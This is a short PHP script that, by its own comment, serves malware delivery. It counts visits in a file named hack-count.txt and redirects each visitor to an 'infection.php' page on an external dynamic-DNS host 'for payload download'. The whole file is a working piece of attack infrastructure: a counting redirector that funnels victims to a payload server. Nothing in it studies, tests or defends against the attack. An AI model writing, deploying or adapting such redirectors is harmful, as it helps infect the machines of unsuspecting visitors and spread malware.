<?php
/**
 * Reads the current download count from the file hack-count.txt, increments it by 1, and writes it back to the file.
 * Then redirects the user to the infection.php page for payload download.
 */
$hack_count = (int)file_get_contents('hack-count.txt');
$hack_count++;
file_put_contents('hack-count.txt', $hack_count);

header('Location: https://withersteen.zapto.org/webmaster/infection.php');

